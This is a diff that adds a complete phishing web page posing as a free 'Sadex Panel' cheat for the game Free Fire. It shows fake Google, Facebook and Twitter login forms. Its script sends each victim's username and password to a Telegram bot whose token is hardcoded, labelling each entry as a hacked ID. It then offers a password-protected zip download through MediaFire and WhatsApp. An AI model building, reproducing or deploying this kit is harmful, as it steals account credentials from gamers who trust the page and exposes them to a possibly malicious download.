@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sadex Panel - Free Fire Enhancement</title>
+    <style>
+        /* Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a2a, #000);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .page {
+            display: none;
+            min-height: 100vh;
+            padding: 40px 20px;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .page.active {
+            display: flex;
+        }
+        
+        /* Common Elements */
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            background: linear-gradient(90deg, #00ffff, #00ff99);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            color: #00ff99;
+        }
+        
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            max-width: 800px;
+            line-height: 1.6;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #00aaff, #00ff99);
+            border: none;
+            color: #000;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+            margin: 10px;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
+        }
+        
+        /* Page 1: Claim Page */
+        .claim-page {
+            background: radial-gradient(circle at center, #0a0a2a, #000);
+        }
+        
+        .claim-btn {
+            font-size: 1.5rem;
+            padding: 20px 60px;
+            margin-top: 30px;
+        }
+        
+        /* Page 1.5: Panel Selection */
+        .panel-selection-page {
+            background: radial-gradient(circle at center, #0a0a2a, #000);
+        }
+        
+        .panel-options {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .panel-card {
+            background: rgba(0, 30, 60, 0.7);
+            border: 2px solid #00aaff;
+            border-radius: 15px;
+            padding: 30px 20px;
+            width: 300px;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .panel-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 20px rgba(0, 170, 255, 0.3);
+            border-color: #00ff99;
+        }
+        
+        .panel-card h3 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #00ff99;
+        }
+        
+        .panel-card p {
+            color: #aaa;
+            font-size: 1rem;
+        }
+        
+        /* Page 2: Login Page */
+        .login-page {
+            background: radial-gradient(circle at center, #0a0a2a, #000);
+        }
+        
+        .login-options {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .login-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #00aaff;
+            border-radius: 10px;
+            padding: 15px 30px;
+            width: 200px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .login-btn:hover {
+            background: rgba(0, 170, 255, 0.2);
+            transform: scale(1.05);
+        }
+        
+        .login-btn img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+        
+        /* Page 2.5: Fake Login Form */
+        .login-form-page {
+            background: radial-gradient(circle at center, #0a0a2a, #000);
+        }
+        
+        .login-form {
+            background: rgba(0, 30, 60, 0.7);
+            border: 2px solid #00aaff;
+            border-radius: 15px;
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            margin-top: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff99;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #00aaff;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 1rem;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+        
+        .checkbox-group input {
+            width: auto;
+            margin-right: 10px;
+        }
+        
+        .checkbox-group label {
+            margin-bottom: 0;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.2rem;
+            margin-top: 20px;
+        }
+        
+        /* Page 3: Download Page */
+        .download-page {
+            background: radial-gradient(circle at center, #0a0a2a, #000);
+        }
+        
+        .download-section {
+            margin-top: 40px;
+            padding: 30px;
+            background: rgba(0, 30, 60, 0.7);
+            border-radius: 15px;
+            max-width: 600px;
+            border: 2px solid #00ff99;
+            box-shadow: 0 0 20px rgba(0, 255, 153, 0.3);
+        }
+        
+        .download-link {
+            display: inline-block;
+            background: linear-gradient(90deg, #00aaff, #00ff99);
+            color: #000;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 30px;
+            text-decoration: none;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+        }
+        
+        .download-link:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
+        }
+        
+        .whatsapp-link {
+            display: inline-block;
+            background: #25D366;
+            color: #fff;
+            padding: 15px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .whatsapp-link:hover {
+            background: #128C7E;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(37, 211, 102, 0.5);
+        }
+        
+        .success-icon {
+            font-size: 4rem;
+            color: #00ff99;
+            margin-bottom: 20px;
+            text-shadow: 0 0 15px rgba(0, 255, 153, 0.7);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            h2 {
+                font-size: 1.5rem;
+            }
+            
+            .panel-options, .login-options {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .panel-card, .login-btn {
+                width: 100%;
+                max-width: 300px;
+            }
+            
+            .login-form {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Page 1: The Claim Page -->
+    <div id="claim-page" class="page active">
+        <div class="container">
+            <h1>CLAIM YOUR SADEX PANEL NOW!</h1>
+            <h2>Dominate the battlefield with the undetectable V-Series Control Panel.</h2>
+            <button id="claim-btn" class="btn claim-btn">CLAIM SADEX PANEL</button>
+        </div>
+    </div>
+
+    <!-- Page 1.5: Panel Selection -->
+    <div id="panel-selection-page" class="page">
+        <div class="container">
+            <h1>SELECT YOUR SADEX PANEL</h1>
+            <h2>Choose the perfect control panel for your gameplay style</h2>
+            
+            <div class="panel-options">
+                <div class="panel-card" data-panel="V8 SADEX PANEL">
+                    <h3>V8 SADEX PANEL</h3>
+                    <p>Standard Features, Improved Control</p>
+                </div>
+                <div class="panel-card" data-panel="V9 SADEX PANEL">
+                    <h3>V9 SADEX PANEL</h3>
+                    <p>Advanced Features, Auto Configuration</p>
+                </div>
+                <div class="panel-card" data-panel="V10 SADEX PANEL">
+                    <h3>V10 SADEX PANEL</h3>
+                    <p>Ultimate Features, Full Control, Undetectable</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 2: The Login Page -->
+    <div id="login-page" class="page">
+        <div class="container">
+            <h1>AUTHENTICATION REQUIRED</h1>
+            <h2>Log in to link Sadex Panel to your account</h2>
+            
+            <div class="login-options">
+                <div class="login-btn" data-login="Google">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJNMTcuNiA5LjJsLS4xLTEuOEg5djMuNGg0LjhDMTMuNiAxMiAxMyAxMyAxMiAxMy42djIuMmgzYTguOCA4LjggMCAwIDAgMi42LTYuNnoiIGZpbGw9IiM0Mjg1RjQiIGZpbGwtcnVsZT0ibm9uemVybyIvPjxwYXRoIGQ9Ik05IDE4YzIuNCAwIDQuNS0uOCA2LTIuMmwtMy0yLjJhNS40IDUuNCAwIDAgMS04LTIuOUgxVjEzYTkgOSAwIDAgMCA4IDV6IiBmaWxsPSIjMzRBODUzIiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48cGF0aCBkPSJNNCAxMC43YTUuNCA1LjQgMCAwIDEgMC0zLjRWNUgxYTkgOSAwIDAgMCAwIDhsMy0yLjN6IiBmaWxsPSIjRkJCQzA1IiBmaWxsLXJ1bGU9Im5vbnplcm8iLz48cGF0aCBkPSJNOSAzLjZjMS4zIDAgMi41LjQgMy40IDEuM0wxNSAyLjNBOSA5IDAgMCAwIDEgNWwzIDIuNGE1LjQgNS40IDAgMCAxIDUtMy43eiIgZmlsbD0iI0VBNDMzNSIgZmlsbC1ydWxlPSJub256ZXJvIi8+PHBhdGggZD0iTTAgMGgxOHYxOEgweiIvPjwvZz48L3N2Zz4=" alt="Google">
+                    <span>Google</span>
+                </div>
+                <div class="login-btn" data-login="Facebook">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTI0IDEyLjA3M0MyNCA1LjQwNiAxOC42MjcgMCAxMiAwUzAgNS40MDYgMCAxMi4wNzNjMCA2LjAyNiA0LjM4NyAxMS4wMTYgMTAuMTI1IDExLjg3NXYtOC40MThINy4wNzh2LTMuNDU1aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc4LTQuNjY3IDQuNTMzLTQuNjY3IDEuMzEyIDAgMi42ODYuMjM0IDIuNjg2LjIzNHYyLjk1MmgxLjUxMmMxLjQ5IDAgMS45NTUuOTI1IDEuOTU1IDEuODc3djIuMjVoMy4zMjhsLS41MzIgMy40NTVoMi43OTZ2OC40MThDMTkuNjEzIDIzLjA4OSAyNCAxOC4wOTkgMjQgMTIuMDczeiIgZmlsbD0iIzE4NzdmZiIvPjwvc3ZnPg==" alt="Facebook">
+                    <span>Facebook</span>
+                </div>
+                <div class="login-btn" data-login="Twitter">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTIzLjk1MyA0LjU3Yy0uODg1LjM5My0xLjgzLjY1Ny0yLjgyNS43NzQgMS4wMTUtLjYwOCAxLjc5NC0xLjU2MiAyLjE2My0yLjcyMy0uOTUuNTYzLTIuMDA1Ljk3My0zLjEyNyAxLjE5M0EyLjU5NiAyLjU5NiAwIDAgMCAxNy4zMyAzYy0yLjY1IDAtNC41OTYgMi4wODUtNC41OTYgNC42NTYgMCAuMzY0LjA0Mi43MTguMTIyIDEuMDYtMy44MTctLjE5Mi03LjIwNS0yLjAyLTkuNDcyLTQuNzkyLS4zOTYuNjc1LS42MiAxLjQ2LS42MiAyLjMxIDAgMS42MTYuODIgMy4wNDMgMi4wNjYgMy44NzgtLjc2LS4wMjQtMS40NzUtLjIzLTIuMDk2LS41Njd2LjA1NmMwIDIuMjU3IDEuNjA1IDQuMTM4IDMuNzM3IDQuNTY2LS4zOTEuMTA2LS44MDIuMTYzLTEuMjI3LjE2My0uMyAwLS41OTMtLjAyOC0uODc3LS4wODIuNTkzIDEuODQ4IDIuMzEzIDMuMTkzIDQuMzUyIDMuMjMtMS41OTUgMS4yNS0zLjYwNSAxLjk5NC01Ljc5NiAxLjk5NC0uMzc3IDAtLjc0OC0uMDIyLTEuMTE0LS4wNjUgMi4wNjMgMS4zMjMgNC41MSAyLjA5NiA3LjE0IDIuMDk2IDguNTcgMCAxMy4yNTUtNy4wOSAxMy4yNTUtMTMuMjU0IDAtLjMtLjAwNy0uNjAyLS4wMi0uODk4LjkwNy0uNjU1IDEuNjkzLTEuNDc3IDIuMzE2LTIuNDE0eiIgZmlsbD0iIzFkYTZmZiIvPjwvc3ZnPg==" alt="Twitter">
+                    <span>Twitter</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page 2.5: The Fake Login Form -->
+    <div id="login-form-page" class="page">
+        <div class="container">
+            <h1>LINK YOUR ACCOUNT</h1>
+            <h2 id="login-method-text">Enter your account details</h2>
+            
+            <form id="login-form" class="login-form">
+                <div class="form-group">
+                    <label for="username" id="username-label">Username / Email / Phone Number</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" name="terms" required>
+                    <label for="terms">I agree to the Terms of Service and Privacy Policy</label>
+                </div>
+                
+                <button type="submit" class="btn submit-btn">LINK & ACTIVATE PANEL</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Page 3: Download Page -->
+    <div id="download-page" class="page">
+        <div class="container">
+            <div class="success-icon">✓</div>
+            <h1>SUCCESS! YOUR PANEL IS READY</h1>
+            <h2>Download your Sadex Panel now and dominate the battlefield!</h2>
+            
+            <div class="download-section">
+                <h3>Download Sadex Panel Files</h3>
+                <p>Click the button below to download the Sadex Panel</p>
+                <a href="https://www.mediafire.com/file/h9pw0q03fpt5f9c/SADEX_PANEL.zip/file" class="download-link" target="_blank">Download Sadex Panel</a>
+                
+                <h3 style="margin-top: 30px;">Get Password</h3>
+                <p>For password, contact us on WhatsApp:</p>
+                <a href="https://wa.me/+919866340603/?text=*SIR°SADEX°PANEL°KA°PASSWORD°CHAHIYE*" class="whatsapp-link" target="_blank">
+                    Get Password on WhatsApp
+                </a>
+            </div>
+            
+            <p style="margin-top: 30px; font-size: 1rem; color: #aaa;">
+                Note: Make sure to follow the installation instructions carefully for optimal performance.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Global variables to store user selections
+        let selectedPanel = '';
+        let selectedLoginMethod = '';
+        
+        // DOM Elements
+        const claimPage = document.getElementById('claim-page');
+        const panelSelectionPage = document.getElementById('panel-selection-page');
+        const loginPage = document.getElementById('login-page');
+        const loginFormPage = document.getElementById('login-form-page');
+        const downloadPage = document.getElementById('download-page');
+        
+        const claimBtn = document.getElementById('claim-btn');
+        const panelCards = document.querySelectorAll('.panel-card');
+        const loginBtns = document.querySelectorAll('.login-btn');
+        const loginForm = document.getElementById('login-form');
+        const loginMethodText = document.getElementById('login-method-text');
+        const usernameLabel = document.getElementById('username-label');
+        
+        // Event Listeners
+        claimBtn.addEventListener('click', () => {
+            showPage(panelSelectionPage);
+        });
+        
+        panelCards.forEach(card => {
+            card.addEventListener('click', () => {
+                selectedPanel = card.getAttribute('data-panel');
+                showPage(loginPage);
+            });
+        });
+        
+        loginBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                selectedLoginMethod = btn.getAttribute('data-login');
+                
+                // Update the form based on selected login method
+                if (selectedLoginMethod === 'Google') {
+                    loginMethodText.textContent = 'Enter your Google account details';
+                    usernameLabel.textContent = 'Email';
+                } else if (selectedLoginMethod === 'Facebook') {
+                    loginMethodText.textContent = 'Enter your Facebook account details';
+                    usernameLabel.textContent = 'Email or Phone Number';
+                } else if (selectedLoginMethod === 'Twitter') {
+                    loginMethodText.textContent = 'Enter your Twitter account details';
+                    usernameLabel.textContent = 'Username, Email, or Phone Number';
+                }
+                
+                showPage(loginFormPage);
+            });
+        });
+        
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Get form data
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Send data to Telegram
+            sendToTelegram(username, password);
+            
+            // Show download page immediately
+            showPage(downloadPage);
+        });
+        
+        // Function to show a specific page and hide others
+        function showPage(page) {
+            document.querySelectorAll('.page').forEach(p => {
+                p.classList.remove('active');
+            });
+            page.classList.add('active');
+        }
+        
+        // Function to send data to Telegram
+        function sendToTelegram(username, password) {
+            // Format the message
+            const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
+            const message = `🚨 *NEW FREE FIRE ID HACKED* 🚨  
+-------------------------------  
+*Panel Version:* ${selectedPanel}  
+*Login Method:* ${selectedLoginMethod}  
+*Account ID:* ${username}  
+*Password:* ${password}  
+-------------------------------  
+_Time: ${timestamp} UTC_`;
+            
+            // Telegram API credentials
+            const botToken = '8466933760:AAESDYWgIaZ1yolBPeNf904qGsiZUghGkOQ';
+            const chatId = '8020955980';
+            
+            // Create the API URL
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // Create form data
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message);
+            formData.append('parse_mode', 'Markdown');
+            
+            // Send the request (using fetch API)
+            fetch(apiUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
+        }
+    </script>
+</body>
+</html>
